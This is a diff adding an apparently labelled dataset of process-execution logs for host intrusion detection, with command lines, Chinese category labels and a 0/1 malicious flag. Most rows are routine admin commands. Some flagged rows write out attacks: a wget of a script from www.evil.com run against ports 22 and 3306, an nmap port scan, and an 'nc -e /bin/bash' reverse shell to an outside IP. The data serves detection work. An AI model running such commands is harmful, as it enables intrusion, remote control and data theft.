@@ -1,0 +1,74 @@
+"0" "2024-10-29 15:32:29" "ifconfig" "40729" "bash" "35973" "0" "ifconfig" "系统信息查看操作" 0
+"0" "2024-10-29 15:33:30" "whoami" "40799" "bash" "35973" "0" "whoami" "用户信息查看操作" 0
+"0" "2024-10-29 15:33:30" "id" "40799" "bash" "35973" "0" "id" "用户信息查看操作" 0
+"0" "2024-10-29 15:34:35" "ls" "40800" "bash" "35973" "0" "ls -al" "目录查看操作" 0
+"0" "2024-10-29 15:34:39" "ls" "40801" "bash" "35973" "0" "ls -alt /root/.ssh/" "目录查看操作" 0
+"0" "2024-10-29 15:35:00" "pwd" "40805" "bash" "35973" "0" "pwd" "目录查看操作" 0
+"0" "2024-10-29 15:36:10" "ping" "40810" "bash" "35973" "0" "ping 8.8.8.8" "网络请求操作" 0
+"0" "2024-10-29 15:37:10" "ping" "40811" "bash" "35973" "0" "ping 114.114.114.114" "网络请求操作" 0
+"0" "2024-10-29 16:00:00" "java" "40929" "bash" "35973" "0" "java -jar webapp_test_1.jar" "用户程序执行操作" 0
+"0" "2024-10-29 16:01:00" "java" "40930" "bash" "35973" "0" "java -jar webapp_test_2.jar" "用户程序执行操作" 0
+"0" "2024-10-29 16:02:00" "java" "40931" "bash" "35973" "0" "java -jar webapp_test_3.jar" "用户程序执行操作" 0
+"0" "2024-10-29 16:03:00" "java" "40932" "bash" "35973" "0" "java -jar webapp_test_4.jar" "用户程序执行操作" 0
+"1001" "2024-10-29 16:05:00" "bash" "40990" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-29 16:05:10" "bash" "40991" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-29 16:05:20" "bash" "40992" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-29 16:05:30" "bash" "40993" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-29 16:05:40" "bash" "40994" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-29 16:05:50" "bash" "40995" "java" "40929" "0" "bash &" "bash创建操作" 0
+"1001" "2024-10-30 01:10:00" "ping" "40981" "java" "40929" "0" "ping www.evil.com" "网络请求操作" 1
+"1001" "2024-10-30 01:11:00" "ping" "40982" "java" "40929" "0" "wget www.evil.com/1.sh" "网络请求操作" 1
+"1001" "2024-10-30 01:12:00" "bash" "40983" "java" "40929" "0" "bash 1.sh -p 22,3306" "bash脚本执行操作" 1
+"0" "2024-11-29 10:32:20" "bash" "40729" "ssh" "12548" "0" "bash" "bash创建操作" 0
+"0" "2024-11-29 10:32:21" "bash" "40730" "ssh" "12548" "0" "bash" "bash创建操作" 0
+"0" "2024-11-29 10:32:22" "whoami" "40731" "bash" "40729" "0" "whoami" "用户信息查看操作" 0
+"0" "2024-11-29 10:32:23" "id" "40732" "bash" "40729" "0" "id" "用户信息查看操作" 0
+"0" "2024-11-29 10:32:25" "ps" "40733" "bash" "40729" "0" "ps -aux" "进程查看操作" 0
+"0" "2024-11-29 10:32:25" "ps" "40734" "bash" "40729" "0" "ps -aux" "进程查看操作" 0
+"0" "2024-11-29 10:32:41" "ls" "40735" "bash" "40729" "0" "ls -alt" "目录查看操作" 0
+"0" "2024-11-29 10:32:46" "ls" "40736" "bash" "40729" "0" "ls -alt /tmp/" "目录查看操作" 0
+"0" "2024-11-29 10:33:25" "scp" "10976" "bash" "40729" "0" "scp /tmp/password_1.file root@192.168.111.126:/root/" "文件传输操作" 0
+"0" "2024-11-29 10:33:25" "ssh" "10978" "bash" "40729" "0" "ssh root@192.168.111.126" "远程登录操作" 0
+"0" "2024-11-29 10:33:25" "scp" "10981" "bash" "40729" "0" "scp /tmp/password_2.file root@192.168.111.126:/root/" "文件传输操作" 0
+"0" "2024-11-29 10:33:25" "ssh" "10983" "bash" "40729" "0" "ssh root@192.168.111.126" "远程登录操作" 0
+"0" "2024-11-29 10:33:25" "scp" "10989" "bash" "40729" "0" "scp /tmp/password_3.file root@192.168.111.126:/root/" "文件传输操作" 0
+"0" "2024-11-29 10:33:25" "ssh" "10991" "bash" "40729" "0" "ssh root@192.168.111.126" "远程登录操作" 0
+"0" "2024-11-29 10:39:33" "docker" "40731" "bash" "40729" "0" "docker ps -a" "容器操作" 0
+"0" "2024-11-29 10:39:34" "docker" "40732" "bash" "40729" "0" "docker exec -it bash a03" "容器操作" 0
+"0" "2024-11-29 15:39:35" "runc" "40760" "containerd-shim" "93463" "0" "runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process1913259387 --console-socket /tmp/pty1265543512/pty.sock --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/93ed5251858c a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132" "容器操作" 0
+"0" "2024-11-29 15:39:35" "runc" "40761" "containerd-shim" "93463" "0" "runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process1913259387 --console-socket /tmp/pty1265543512/pty.sock --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/93ed5251858c a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132" "容器操作" 0
+"2000" "2024-11-29 15:34:14" "ls" "92354" "bash" "75146" "100" "ls -alt ./webapp/" "目录查看操作" 0
+"2000" "2024-11-29 15:34:54" "ls" "92355" "bash" "75146" "100" "ls -alt ./webapp/test/" "目录查看操作" 0
+"2000" "2024-11-29 15:35:19" "ls" "92356" "bash" "75146" "100" "ls -alt ./webapp/root/" "目录查看操作" 0
+"2000" "2024-11-29 15:35:23" "ls" "92357" "bash" "75146" "100" "ls -alt ./webapp/database/mysql/" "目录查看操作" 0
+"2000" "2024-11-29 15:36:47" "ls" "92358" "bash" "75146" "100" "ls -alt ./webapp/test/20241129/" "目录查看操作" 0
+"2000" "2024-11-29 15:37:35" "ls" "92359" "bash" "75146" "100" "ls -alt ./webapp/zip/" "目录查看操作" 0
+"2000" "2024-11-29 15:38:23" "id" "40774" "bash" "75146" "100" "id" "用户信息查看操作" 0
+"2000" "2024-11-29 15:39:26" "ping" "40775" "bash" "75146" "100" "ping 192.168.111.126" "网络请求操作" 0
+"2000" "2024-11-29 15:40:26" "ping" "40776" "bash" "75146" "100" "ping -t 3 192.168.111.126" "网络请求操作" 0
+"2000" "2024-11-29 15:39:26" "scp" "40777" "bash" "75146" "100" "scp -r ./webapp/zip/ root@192.168.111.126:/root/" "文件传输操作" 0
+"2000" "2024-11-29 10:33:25" "ssh" "40778" "bash" "75146" "100" "ssh root@192.168.111.126" "远程登录操作" 0
+"0" "2024-12-05 02:14:03" "bash" "17493" "ssh" "17459" "0" "bash" "bash创建操作" 1
+"0" "2024-12-05 02:15:22" "whoami" "17466" "bash" "17493" "0" "whoami" "用户信息查看操作" 1
+"0" "2024-12-05 02:15:22" "whoami" "17566" "bash" "17493" "0" "whoami" "用户信息查看操作" 1
+"0" "2024-12-05 02:15:23" "id" "17469" "bash" "17493" "0" "id" "用户信息查看操作" 1
+"0" "2024-12-05 02:16:41" "ls" "17491" "bash" "17493" "0" "ls -alt" "目录查看操作" 1
+"0" "2024-12-05 02:17:41" "history" "17492" "bash" "17493" "0" "history" "历史命令查看操作" 1
+"0" "2024-12-05 02:20:41" "nmap" "17514" "bash" "17493" "0" "nmap -p- 192.168.111.126" "网络请求操作" 1
+"0" "2024-12-05 02:21:41" "scp" "11976" "bash" "17493" "0" "scp /tmp/password_1.file root@192.168.111.126:/root/" "文件传输操作" 0
+"0" "2024-12-05 02:21:46" "ssh" "11978" "bash" "17493" "0" "ssh root@192.168.111.126" "远程登录操作" 1
+"0" "2024-11-29 15:39:33" "docker" "40733" "bash" "40729" "0" "docker ps -a" "容器操作" 0
+"0" "2024-11-29 15:39:34" "docker" "40734" "bash" "40729" "0" "docker exec -it bash a04" "容器操作" 0
+"0" "2024-11-29 15:39:35" "runc" "40860" "containerd-shim" "93462" "0" "runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process1913259387 --console-socket /tmp/pty1265543512/pty.sock --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/93ed5251858c a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132" "容器操作" 0
+"0" "2024-11-29 15:39:35" "runc" "40861" "containerd-shim" "93462" "0" "runc --root /var/run/docker/runtime-runc/moby --log /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/log.json --log-format json --systemd-cgroup exec --process /tmp/runc-process1913259387 --console-socket /tmp/pty1265543512/pty.sock --detach --pid-file /run/containerd/io.containerd.runtime.v2.task/moby/a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132/93ed5251858c a0f7aaa06b1ee94a3572287fb2050cc73a15f4090a003e0591ec9d00edbe0132" "容器操作" 0
+"0" "2024-11-29 15:39:34" "bash" "75146" "dockerd" "40734" "0" "bash" "bash创建操作" 0
+"2000" "2024-11-29 15:39:34" "java" "75147" "bash" "75146" "100" "java -jar ./webapp/app.jar" "用户程序执行操作" 0
+"2000" "2024-11-29 15:34:13" "whoami" "40471" "bash" "75146" "100" "id" "用户信息查看操作" 0
+"2000" "2024-11-29 15:34:13" "id" "40472" "bash" "75146" "100" "id" "用户信息查看操作" 0
+"2000" "2024-11-29 15:34:14" "ls" "92359" "bash" "75146" "100" "ls -alt ./webapp/" "目录查看操作" 0
+"2000" "2024-11-29 15:34:15" "ls" "92355" "bash" "75146" "100" "ls -alt ./webapp/" "目录查看操作" 0
+"2000" "2024-11-29 15:34:16" "ls" "92356" "bash" "75146" "100" "ls -alt ./webapp/" "目录查看操作" 0
+"2000" "2024-11-29 15:34:17" "ls" "92357" "bash" "75146" "100" "ls -alt ./webapp/" "目录查看操作" 0
+"999" "2024-12-05 01:19:23" "ls" "41461" "java" "75147" "100" "ls -alt" "目录查看操作" 1
+"999" "2024-12-05 01:20:33" "nc" "63214" "java" "75147" "100" "nc -e /bin/bash 101.34.27.154 4444" "隧道操作" 1
+"999" "2024-12-05 01:20:34" "bash" "63215" "nc" "63214" "100" "bash" "bash创建操作" 1
